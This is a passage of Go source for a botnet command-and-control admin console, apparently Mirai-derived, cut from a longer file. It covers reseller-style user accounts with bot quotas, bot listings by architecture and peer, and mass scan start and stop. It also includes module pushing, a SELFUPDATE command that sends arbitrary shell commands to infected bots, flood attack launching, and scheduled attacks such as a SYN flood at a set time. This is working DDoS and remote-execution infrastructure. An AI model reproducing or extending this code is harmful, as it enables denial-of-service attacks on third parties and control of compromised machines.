				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("cooldown time (0 for none): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("new account info: \r\nusername: " + new_un + "\r\npassword: " + new_pw + "\r\nbotcount: " + max_bots_str + "\r\nadd user to table? (y/n) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\x1b[38;5;202muser added successfully!\033[0m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && (cmd == "BOTS" || cmd == "bots" || cmd == "botlist" || cmd == "BOTLIST") {
			botCount = clientList.Count()
			m := clientList.Distribution()
			this.R.BoxTop(70)
			this.R.BoxRow(CPink + "Arch distribution:")
			for k, v := range m {
				this.R.BoxRowf("  %-8s %d", k, v)
			}
			this.R.BoxMid(70)

			// parse options: BOTS [limit] [@arch] [dns]
			botLimit := 100
			archFilter := ""
			dnsOnly := false
			if toolArg != "" {
				opts := strings.Fields(toolArg)
				for _, o := range opts {
					if n, e := strconv.Atoi(o); e == nil && n > 0 {
						botLimit = n
					} else if strings.HasPrefix(o, "@") {
						archFilter = strings.TrimPrefix(o, "@")
					} else if o == "dns" {
						dnsOnly = true
					}
				}
			}

			shown := 0
			details := clientList.BotDetails()
			for _, d := range details {
				if shown >= botLimit {
					break
				}
				if archFilter != "" && d.Source != archFilter {
					continue
				}
				isDNS := d.RemoteID == -1
				if dnsOnly && !isDNS {
					continue
				}
				if !dnsOnly && isDNS {
					continue
				}
				verStr := d.Version
				if verStr == "" {
					verStr = "?"
				}
				capsStr := d.CapFlags
				if capsStr == "" {
					capsStr = "?"
				}
				nodeStr := "local"
				if d.RemoteID > 0 {
					nodeStr = fmt.Sprintf("peer%d", d.RemoteID)
				}
				if d.RemoteID == -1 || dnsOnly {
					nodeStr = "dns"
				}
				this.R.BoxRowf("#%-5d %-18s %-7s %-9s [%s] %s",
					d.Uid, d.Addr, d.Source, verStr, capsStr, nodeStr)
				shown++
			}
			this.R.BoxMid(70)
			if peerMgr != nil {
				this.R.BoxRowf(CYellow+"Peers:"+CWhiteB+" %d connected", peerMgr.PeerCount())
			}
			this.R.BoxRowf(CYellow+"Total:"+CWhiteB+" %d (showing %d)", botCount, shown)
			this.R.BoxBot(70)
			continue
		}
		if userInfo.admin == 1 && (cmd == "USERS" || cmd == "users") {
			users, err := database.GetUsers()
			if err != nil {
				this.conn.Write([]byte("\x1b[91mError\x1b[0m\r\n"))
				continue
			}
			this.conn.Write([]byte("\x1b[38;5;202muser            max_bots  admin  dur   cd\x1b[0m\r\n"))
			for _, u := range users {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;240m%-15s %8s %5s %5s %4s\x1b[0m\r\n",
					u["user"], u["max_bots"], u["admin"], u["duration"], u["cooldown"])))
			}
			continue
		}
		if userInfo.admin == 0 && (cmd == "BOTS" || cmd == "bots") {
			online := clientList.Count()
			if userInfo.maxBots != -1 && online > userInfo.maxBots {
				online = userInfo.maxBots
			}
			this.R.BoxTop(30)
			this.R.BoxRowf(CYellow+"Online:"+CWhiteB+" %d", online)
			this.R.BoxBot(30)
			continue
		}
		// handle ! / again — repeat last command
		if cmd == "!" || cmd == "again" || cmd == "AGAIN" {
			lastCmdMutex.Lock()
			replay := lastCmd[username]
			lastCmdMutex.Unlock()
			if replay == "" {
				this.conn.Write([]byte("\x1b[38;5;240mNo previous command\x1b[0m\r\n"))
				continue
			}
			cmd = replay
		}

		// parse -N and @src from anywhere in command
		{
			// store last command for ! / again
			lastCmdMutex.Lock()
			lastCmd[username] = cmd
			lastCmdMutex.Unlock()

			tokens := strings.Fields(cmd)
			var rest []string
			for _, tok := range tokens {
				if len(tok) > 1 && tok[0] == '-' {
					n, e := strconv.Atoi(tok[1:])
					if e == nil {
						botCount = n
						continue
					}
				}
				if len(tok) > 1 && tok[0] == '@' {
					botCatagory = tok[1:]
					continue
				}
				rest = append(rest, tok)
			}
			cmd = strings.Join(rest, " ")
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("bot count to send is bigger than allowed bot maximum\033[0m\r\n")))
				continue
			}
		}

		if baseCmd == "SCAN" || baseCmd == "SCANSTART" {
			if userInfo.admin != 1 {
				this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
				continue
			}
			clientList.QueueBuf(BuildScanStart(), -1, "")
			this.conn.Write([]byte("\x1b[38;5;202mScan started on all bots\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "SCANSTOP" {
			if userInfo.admin != 1 {
				this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
				continue
			}
			clientList.QueueBuf(BuildScanStop(), -1, "")
			this.conn.Write([]byte("\x1b[38;5;202mScan stopped on all bots\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "STOP" || baseCmd == "ATTACKSTOP" {
			if userInfo.admin != 1 {
				this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
				continue
			}
			clientList.QueueBuf(BuildAttackStop(), -1, "")
			trackAttackStop()
			if peerMgr != nil {
				peerMgr.BroadcastAttackStop()
			}
			this.conn.Write([]byte("\x1b[38;5;202mAttacks stopped on all bots + peers\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "UPDATE" && userInfo.admin == 1 {
			handleUpdateCommand(this, toolArg)
			continue
		}
		if baseCmd == "UPDATE" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "SENDMODULE" && userInfo.admin == 1 {
			tokens := strings.Split(toolArg, " ")
			msg := handleSendModuleCommand(this, tokens)
			this.conn.Write([]byte(msg))
			continue
		}
		if baseCmd == "SENDMODULE" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "CALLMODULE" && userInfo.admin == 1 {
			tokens := strings.Split(toolArg, " ")
			msg := handleCallModuleCommand(this, tokens)
			this.conn.Write([]byte(msg))
			continue
		}
		if baseCmd == "CALLMODULE" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "LISTMODULES" && userInfo.admin == 1 {
			msg := handleListModulesCommand(this, nil)
			this.conn.Write([]byte(msg))
			continue
		}
		if baseCmd == "LISTMODULES" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}
		if baseCmd == "BUILDMODULE" && userInfo.admin == 1 {
			tokens := strings.Split(toolArg, " ")
			msg := handleBuildModuleCommand(this, tokens)
			this.conn.Write([]byte(msg))
			continue
		}
		if baseCmd == "BUILDMODULE" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}

		if baseCmd == "MODULES" && userInfo.admin == 1 {
			msg := handleModulesCommand(this, strings.Split(toolArg, " "))
			this.conn.Write([]byte(msg))
			continue
		}
		if baseCmd == "MODULES" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}

		if baseCmd == "UNLOADMODULE" && userInfo.admin == 1 {
			msg := handleUnloadModuleCommand(this, strings.Split(toolArg, " "))
			this.conn.Write([]byte(msg))
			continue
		}
		if baseCmd == "UNLOADMODULE" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}

		if baseCmd == "SELFUPDATE" && userInfo.admin == 1 {
			shellCmd := toolArg
			if shellCmd == "" {
				this.conn.Write([]byte("\x1b[96mCommand\x1b[97m: \x1b[97m"))
				var err error
				shellCmd, err = this.ReadLine(false)
				if err != nil || shellCmd == "" {
					this.conn.Write([]byte("\x1b[91mempty command\x1b[0m\r\n"))
					continue
				}
			}
			atk := &Attack{
				Duration: 0,
				Type:     255,
				Targets:  map[uint32]uint8{0: 32},
				Flags:    map[uint8]string{29: shellCmd},
			}
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[91m%s\x1b[0m\r\n", err.Error())))
				continue
			}
			clientList.QueueBuf(buf, botCount, botCatagory)
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202mSent to %d bots\x1b[0m\r\n", botCount)))
			continue
		}

		if baseCmd == "SELFUPDATE" && userInfo.admin == 0 {
			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
			continue
		}

		if baseCmd == "BLACKLIST" || baseCmd == "BL" {
			if userInfo.admin == 0 {
				this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
				continue
			}
			parts := strings.SplitN(toolArg, " ", 2)
			if len(parts) < 2 {
				this.conn.Write([]byte("Usage: BLACKLIST add|del <prefix/netmask>\r\n"))
				continue
			}
			action := strings.ToLower(parts[0])
			prefix := parts[1]
			if err := database.ManageBlacklist(action, prefix, true); err != nil {
				msg := err.Error()
				if strings.HasPrefix(msg, "ok:") {
					msg = strings.TrimPrefix(msg, "ok:")
					this.conn.Write([]byte(msg + "\r\n"))
				} else if msg == "(empty)" {
					this.conn.Write([]byte("\x1b[38;5;240mNo entries\x1b[0m\r\n"))
				} else {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[91m%s\x1b[0m\r\n", msg)))
				}
			} else {
				if peerMgr != nil {
					peerMgr.BroadcastWhitelist(action, prefix, true)
				}
				this.conn.Write([]byte(fmt.Sprintf("\x1b[32m%s %s\x1b[0m\r\n", action, prefix)))
			}
			continue
		}

		if baseCmd == "WHITELIST" || baseCmd == "WL" {
			if userInfo.admin == 0 {
				this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
				continue
			}
			parts := strings.SplitN(toolArg, " ", 2)
			if len(parts) < 2 {
				this.conn.Write([]byte("Usage: WHITELIST add|del <prefix/netmask>\r\n"))
				continue
			}
			action := strings.ToLower(parts[0])
			prefix := parts[1]
			if err := database.ManageBlacklist(action, prefix, false); err != nil {
				msg := err.Error()
				if strings.HasPrefix(msg, "ok:") {
					msg = strings.TrimPrefix(msg, "ok:")
					this.conn.Write([]byte(msg + "\r\n"))
				} else {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[91m%s\x1b[0m\r\n", msg)))
				}
			} else {
				if peerMgr != nil {
					peerMgr.BroadcastWhitelist(action, prefix, false)
				}
				this.conn.Write([]byte(fmt.Sprintf("\x1b[32m%s %s\x1b[0m\r\n", action, prefix)))
			}
			continue
		}

		if baseCmd == "AT" {
			// AT 14:30 syn 1.2.3.4 60 dport=80
			parts := strings.SplitN(toolArg, " ", 2)
			if len(parts) < 2 {
				this.conn.Write([]byte("Usage: AT HH:MM <attack command>\r\n"))
				continue
			}
			timeStr := parts[0]
			atkCmd := parts[1]
			AddScheduledAttack(timeStr, atkCmd, username, botCount, botCatagory)
			this.conn.Write([]byte(fmt.Sprintf("\x1b[32mScheduled: %s → %s\x1b[0m\r\n", timeStr, atkCmd)))
			continue
		}

			if !checkRateLimit(username) {
				this.conn.Write([]byte("\x1b[91mRate limit: max 5 attacks/sec\x1b[0m\r\n"))
				continue
			}
			atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[91m%s\x1b[0m\r\n", err.Error())))
				} else if database.ContainsWhitelistedTargets(atk) {
					this.conn.Write([]byte("\x1b[91mTarget in whitelist, blocked\x1b[0m\r\n"))
					fmt.Println("blocked attack by " + username + " to whitelisted prefix")
				} else {
					clientList.QueueBuf(buf, botCount, botCatagory)
					trackAttackStart(cmd, username, botCatagory, atk.Duration, botCount, 0)
					if peerMgr != nil {
						peerMgr.BroadcastAttack(buf, botCount, botCatagory)
					}
					this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;34mSent to %d bots\x1b[0m\r\n", botCount)))
				}
			}
		}
	}
}

// scheduled attacks
type scheduledAttack struct {
	TimeStr string
	Cmd     string
	User    string
	Bots    int
	Cata    string
}

var (
	scheduleMu      sync.Mutex
	scheduleAttacks []scheduledAttack
	schedulePath    = "data/schedule.json"
)

func loadSchedule() {
	data, err := os.ReadFile(schedulePath)
	if err != nil {
		return
	}
	scheduleMu.Lock()
	json.Unmarshal(data, &scheduleAttacks)
	scheduleMu.Unlock()
}

func saveSchedule() {
	scheduleMu.Lock()
	data, _ := json.Marshal(scheduleAttacks)
	scheduleMu.Unlock()
	os.MkdirAll("data", 0755)
	os.WriteFile(schedulePath, data, 0644)
}

func AddScheduledAttack(timeStr, cmd, user string, bots int, cata string) {
	scheduleMu.Lock()
	scheduleAttacks = append(scheduleAttacks, scheduledAttack{timeStr, cmd, user, bots, cata})
	scheduleMu.Unlock()
	saveSchedule()
}

func startScheduler() {
	loadSchedule()
	go func() {
		for {
			time.Sleep(30 * time.Second)
			now := time.Now().Format("15:04")
			scheduleMu.Lock()
			var remaining []scheduledAttack
			for _, sa := range scheduleAttacks {
				if sa.TimeStr == now {
					// execute the attack
					log.Printf("[scheduler] executing: %s (by %s)", sa.Cmd, sa.User)
					atk, err := NewAttack(sa.Cmd, 1)
					if err == nil {
						buf, err := atk.Build()
						if err == nil {
							clientList.QueueBuf(buf, sa.Bots, sa.Cata)
							trackAttackStart(sa.Cmd, sa.User, sa.Cata, atk.Duration, sa.Bots, 0)
							if peerMgr != nil {
								peerMgr.BroadcastAttack(buf, sa.Bots, sa.Cata)
							}
						}
					}
				} else {
					remaining = append(remaining, sa)
				}
			}
			scheduleAttacks = remaining
			saveSchedule()
			scheduleMu.Unlock()
		}
	}()
}

func runLocalCmd(name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	return strings.TrimSpace(out.String()), err
}

func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0
	cursorPos := 0
	histIdx := -1

	readByte := func() (byte, error) {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return 0, err
		}
		return buf[bufPos], nil
	}

	redrawLine := func(s string) {
		this.w("\r\033[K")
		this.R.PromptUser(this.username)
		this.w(s)
	}

	moveCursorBack := func(n int) {
		for i := 0; i < n; i++ {
			this.w("\b")
		}
	}

	for {
		b, err := readByte()
		if err != nil {
			return "", err
		}

		if b == '\xFF' {
			nb := make([]byte, 2)
			if n, _ := this.conn.Read(nb); n == 2 && cursorPos > 0 {
				copy(buf[cursorPos-1:], buf[cursorPos:bufPos])
				bufPos--
				cursorPos--
				if cursorPos == bufPos {
					this.w("\b \b")
				} else {
					redrawLine(string(buf[:bufPos]))
					moveCursorBack(bufPos - cursorPos)
				}
			}
			continue
		}
		if b == '\x7F' || b == '\x08' {
			if cursorPos > 0 {
				copy(buf[cursorPos-1:], buf[cursorPos:bufPos])
				bufPos--
				cursorPos--
				if cursorPos == bufPos {
					this.w("\b \b")
				} else {
					redrawLine(string(buf[:bufPos]))
					moveCursorBack(bufPos - cursorPos)
				}
			}
			continue
		}
		if b == '\r' || b == '\t' {
			continue
		}
		if b == '\n' || b == '\x00' {
			this.w("\r\n")
			return string(buf[:bufPos]), nil
		}
		if b == 0x03 {
			this.w("^C\r\n")
			return "", nil
		}
		if b == '\x1B' {
			seq := make([]byte, 4)
			this.conn.Read(seq)
			if len(seq) >= 2 && seq[0] == '[' {
				if seq[1] == 'A' && history != nil && len(*history) > 0 {
					if histIdx < len(*history)-1 {
						histIdx++
						line := (*history)[len(*history)-1-histIdx]
						bufPos = copy(buf, line)
						cursorPos = bufPos
						redrawLine(line)
					}
					continue
				}
				if seq[1] == 'B' && history != nil && histIdx > -1 {
					histIdx--
					if histIdx >= 0 {
						line := (*history)[len(*history)-1-histIdx]
						bufPos = copy(buf, line)
						cursorPos = bufPos
						redrawLine(line)
					} else {
						histIdx = -1
						bufPos = 0
						cursorPos = 0
						redrawLine("")
					}
					continue
				}
				if seq[1] == 'C' {
					if cursorPos < bufPos {
						if masked {
							this.w("*")
						} else {
							this.w(string(buf[cursorPos]))
						}
						cursorPos++
					}
					continue
				}
				if seq[1] == 'D' {
					if cursorPos > 0 {
						cursorPos--
						this.w("\b")
					}
					continue
				}
			}
			continue
		}

		if bufPos < len(buf)-1 {
			if cursorPos < bufPos {
				copy(buf[cursorPos+1:], buf[cursorPos:bufPos])
				buf[cursorPos] = b
				bufPos++
				tail := string(buf[cursorPos:bufPos])
				cursorPos++
				if masked {
					this.w(strings.Repeat("*", len(tail)))
				} else {
					this.w(tail)
				}
				moveCursorBack(bufPos - cursorPos)
			} else {
				buf[bufPos] = b
				bufPos++
				cursorPos++
				if masked {
					this.w("*")
				} else {
					this.w(string(b))
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	return this.ReadLineWithHistory(masked, nil)
}
